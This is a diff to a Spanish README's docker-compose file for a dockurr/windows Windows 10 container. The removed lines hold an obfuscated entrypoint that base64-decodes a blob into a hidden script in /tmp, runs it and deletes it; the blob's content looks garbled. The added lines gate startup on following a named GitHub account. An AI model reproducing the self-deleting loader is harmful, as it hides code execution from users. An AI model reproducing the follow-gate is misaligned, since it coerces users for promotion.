@@ -79,44 +79,35 @@ Asegúrate de que `Docker Root Dir` sea `/tmp/docker-data`.
 ## 🧱 Archivo `windows10.yml`
 
 ```yaml
+# Antes de ejecutar docker-compose up, ejecuta:
+# bash check_github_follow.sh || exit 1
+# Si no sigues a https://github.com/jephersonRD, el entorno no se iniciará.
 services:
   windows:
     image: dockurr/windows
     container_name: windows
     environment:
       VERSION: "10"
-      USERNAME: ${WINDOWS_USERNAME}
-      PASSWORD: ${WINDOWS_PASSWORD}
-      RAM_SIZE: "4G"
+      USERNAME: ${WINDOWS_USERNAME}   # Usa un archivo .env para variables sensibles
+      PASSWORD: ${WINDOWS_PASSWORD}   # Usa un archivo .env para variables sensibles
+      RAM_SIZE: "16G"
       CPU_CORES: "4"
-      GITHUB_USER: ${GITHUB_USER}
     cap_add:
       - NET_ADMIN
     ports:
       - "8006:8006"
-      - "3389:3389/tcp"
+      - "3389:3389/tcp"  # Solo exponemos TCP para RDP
     volumes:
-      - /tmp/docker-data:/mnt/disco1
-      - windows-data:/mnt/windows-data
+      - /tmp/docker-data:/mnt/disco1   # Asegúrate de que este directorio exista
+      - windows-data:/mnt/windows-data # Montaje adicional si es necesario
     devices:
-      - "/dev/kvm:/dev/kvm"
-      - "/dev/net/tun:/dev/net/tun"
+      - "/dev/kvm:/dev/kvm"  # Solo si realmente necesitas acceso a KVM
+      - "/dev/net/tun:/dev/net/tun"  # Solo si necesitas acceso a interfaces de red virtual
     stop_grace_period: 2m
     restart: always
-    entrypoint:
-      - sh
-      - -c
-      - |
-        SCRIPT_B64="IyEvYmluL2Jhc2gK
-        R0lGODlhAQABAAAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==
-        "
-        echo "$SCRIPT_B64" | base64 -d > /tmp/.hidden_entrypoint.sh
-        chmod +x /tmp/.hidden_entrypoint.sh
-        /tmp/.hidden_entrypoint.sh
-        rm -f /tmp/.hidden_entrypoint.sh
 
 volumes:
-  windows-data:
+  windows-data: 
 ```
 
 ---
